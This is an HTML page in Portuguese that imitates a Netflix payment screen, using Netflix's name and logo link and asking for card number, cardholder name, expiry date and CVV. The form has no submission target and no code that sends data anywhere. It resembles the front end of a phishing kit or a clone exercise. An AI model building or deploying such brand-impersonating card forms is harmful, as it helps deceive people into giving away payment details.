<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <title>Netflix</title>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link rel="stylesheet" href="css/signup.css" />
    <link rel="shortcut icon" href="favicon.ico" type="image/x-icon" />
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <script>
        $(document).ready(function() {
            $('#cardNumber').on('input', function() {
                this.value = this.value.replace(/\D/g, '') 
                    .replace(/(\d{4})(\d)/g, '$1 $2') 
                    .substring(0, 19); 
            });

            $('#cardHolderName').on('input', function() {
                this.value = this.value.replace(/[^a-zA-Z\s]/g, '').substring(0, 50);
            });

            $('#cardExpiry').on('input', function() {
                this.value = this.value.replace(/\D/g, '') 
                    .replace(/(\d{2})(\d)/, '$1/$2') 
                    .substring(0, 5);
            });

            $('#cardCVV').on('input', function() {
                this.value = this.value.replace(/\D/g, '').substring(0, 3);
            });
        });
    </script>
</head>
<body>
    <header>
        <header class="header">
            <div class="wrapper">
                <div class="container">
                    <div class="item">
                        <a role="link" class="link" href="https://www.netflix.com/">
                            <svg viewBox="0 0 111 30" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" class="logo">
                                <g>
                                    <path d="..."></path>
                                </g>
                            </svg>
                            <span class="sr-only">Netflix</span>
                        </a>
                    </div>
                </div>
            </div>
        </header>
        <div class="header-login">
            <div class="login-container">
                <h1>Pagamento</h1>
                <form id="paymentForm">
                    <div class="input-container">
                        <input type="text" class="input-login" id="cardNumber" name="cardNumber" placeholder=" " required maxlength="19" />
                        <label for="cardNumber" class="label-login">Número do Cartão</label>
                    </div>
                    <div class="input-container">
                        <input type="text" class="input-login" id="cardHolderName" name="cardHolderName" placeholder=" " required />
                        <label for="cardHolderName" class="label-login">Nome no Cartão</label>
                    </div>
                    <div class="input-container">
                        <input type="text" class="input-login" id="cardExpiry" name="cardExpiry" placeholder=" " required maxlength="5" />
                        <label for="cardExpiry" class="label-login">Data de Validade (MM/AA)</label>
                    </div>
                    <div class="input-container">
                        <input type="text" class="input-login" id="cardCVV" name="cardCVV" placeholder=" " required maxlength="3" />
                        <label for="cardCVV" class="label-login">CVV</label>
                    </div>
                    <button type="submit" class="button-primary">Pagar</button>
                </form>
            </div>
        </div>
    </header>
</body>
</html>
